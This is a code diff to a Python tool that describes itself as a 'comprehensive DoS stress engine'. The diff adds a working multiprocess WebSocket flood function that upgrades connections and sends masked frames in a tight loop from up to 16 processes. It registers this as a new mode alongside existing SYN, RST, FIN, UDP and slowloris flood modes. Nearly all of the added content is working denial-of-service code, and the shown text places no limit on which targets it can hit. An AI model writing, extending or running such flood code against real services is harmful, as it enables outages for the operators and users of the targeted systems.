@@ -25,7 +25,7 @@ from h2.connection import H2Connection
 from h2.config import H2Configuration
 from h2.events import ResponseReceived, DataReceived
 
-VERSION = "3.13"
+VERSION = "3.14"
 
 # ── TCP/IP checksum ──────────────────────────────────────────────
 def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
@@ -571,6 +571,81 @@ async def raw_worker(name, url, stats, duration, stop, payload_size=0):
         stats.errors += errors
     stats.conns += n_procs
 
+# ── WebSocket multiprocess: raw socket WS frame flood ────────────
+def _mp_ws_flood(args_tuple):
+    """Multi-process WebSocket flooder: connect, upgrade, send frames."""
+    import time as _time
+    import struct as _struct
+    import base64 as _b64
+    import random as _rand
+    host, port, path, duration, payload_size = args_tuple
+    key = _b64.b64encode(_rand.randbytes(16)).decode()
+    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
+           f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
+           f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n").encode()
+    msgs = 0
+    errors = 0
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5.0)
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        s.connect((host, port))
+        s.sendall(req)
+        # Read handshake response
+        resp = b""
+        while b"\r\n\r\n" not in resp:
+            chunk = s.recv(4096)
+            if not chunk:
+                break
+            resp += chunk
+        if b"101" not in resp:
+            errors += 1
+            s.close()
+            return 0, errors
+        # Build WS frame (text, masked)
+        payload = b"x" * max(1, payload_size)
+        plen = len(payload)
+        if plen < 126:
+            frame_header = b"\x81" + _struct.pack("!B", 0x80 | plen)
+        else:
+            frame_header = b"\x81" + _struct.pack("!BH", 0x80 | 126, plen)
+        mask = _rand.randbytes(4)
+        masked_payload = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
+        frame = frame_header + mask + masked_payload
+        frame_size = len(frame)
+        # Send frames in tight loop
+        end = _time.time() + duration
+        while _time.time() < end:
+            try:
+                s.send(frame)
+                msgs += 1
+            except Exception:
+                break
+        s.close()
+    except Exception:
+        errors += 1
+    return msgs, errors
+
+async def ws_mp_worker(name, url, stats, duration, stop, payload_size=128):
+    """WebSocket multiprocess worker."""
+    host, port, path = parse_ws(url)
+    n_procs = max(1, min(16, _UDP_NPROCS[0]))
+    
+    import multiprocessing as mp
+    ctx = mp.get_context('spawn')
+    targets = [(host, port, path, duration, payload_size)] * n_procs
+    pool = ctx.Pool(n_procs)
+    async_result = pool.map_async(_mp_ws_flood, targets)
+    
+    results = await _wait_pool(pool, async_result, duration + 5)
+    if results is None:
+        results = [(0, 0)] * n_procs
+    
+    for msgs, errors in results:
+        stats.ws_msgs += msgs
+        stats.errors += errors
+    stats.conns += n_procs
+
 # ── SYN flood: connect only, never read ──────────────────────────
 async def syn_worker(name, url, stats, duration, stop, payload_size=0):
     host, port = parse_ip_port(url)
@@ -705,6 +780,7 @@ WORKERS = {
     "fin":       fin_worker,
     'slowloris': slowloris_worker,
     'raw': raw_worker,
+    'wsm': ws_mp_worker,
 }
 
 DEFAULT_PAYLOADS = {
@@ -983,7 +1059,7 @@ def auto_probe(url):
 def main():
     ap = argparse.ArgumentParser(description="dossal v" + VERSION + " — comprehensive DoS stress engine")
     ap.add_argument("--mode", default="http",
-        help="Comma-separated modes: http,https,websocket,tcp,udp,h2,grpc,quic,syn,synack,rst,fin,slowloris")
+        help="Comma-separated modes: http,https,raw,websocket,wsm,tcp,udp,h2,grpc,quic,syn,synack,rst,fin,slowloris")
     ap.add_argument("--auto", action="store_true",
         help="Auto-detect target protocol and select optimal modes")
     ap.add_argument("--url", required=True)
